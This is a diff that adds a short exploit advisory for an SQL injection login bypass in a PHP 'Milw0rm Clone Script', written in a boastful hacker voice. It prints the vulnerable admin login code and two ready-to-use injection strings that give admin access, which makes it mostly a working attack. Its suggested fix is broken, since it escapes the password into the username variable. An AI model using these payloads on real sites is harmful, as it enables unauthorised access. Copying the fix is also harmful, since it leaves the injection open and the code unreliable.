@@ -1,0 +1,46 @@
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+|   Exploit Title: Milw0rm Clone Script v1.0 (Auth Bypass) SQL Injection Vulnerability |
+|            Date: 06.13.2015                                                          |
+|   Exploit Daddy: Walid Naceri                                                        |
+| Vendor Homepage: http://milw0rm.sourceforge.net/                                     |
+|   Software Link: http://sourceforge.net/projects/milw0rm/files/milw0rm.rar/download  |
+|         Version: v1.0                                                                |
+|       Tested On: Kali Linux, Mac, Windows                                            |
+|><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><|
+| Website exploiter: WwW.security-Dz.Com                                               |
+| CALLINGout: 1337day/inj3ct0r Please admit that they got your server haha CIA         |
+| Sorry: Sorry pancaker, you missed that one :(                                        |
+<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
+ 
+ 
+ 
+ 
+### vuln codez  admin/login.php ###
+<?
+$usr = htmlspecialchars(trim($_POST['usr'])); ---- what are you doing?
+$pwd = htmlspecialchars(trim($_POST['pwd'])); ---- are you sure that you are a programmer?
+if($usr && $pwd){
+$login = mysql_query("SELECT * FROM `site_info` WHERE `adm_usr`='".$usr."' AND `adm_pwd`='".md5($pwd)."';");
+$row = mysql_num_rows($login);
+----Bla Bla Bla--------
+ 
+ 
+ 
+ 
+### manual ###
+Go to the login admin panel :)
+
+Exploit 1:
+USER: ADMIN' OR ''='
+PASS: ADMIN' OR ''='
+
+Exploit 2:
+USER: ADMIN' OR 1=1#
+PASS: Anything Bro :)
+
+
+
+### How to fix, learn bro some php again :) ###
+
+$usr = htmlspecialchars(trim(mysql_real_escape_string($_POST['usr'])));
+$usr = htmlspecialchars(trim(mysql_real_escape_string($_POST['pwd'])));
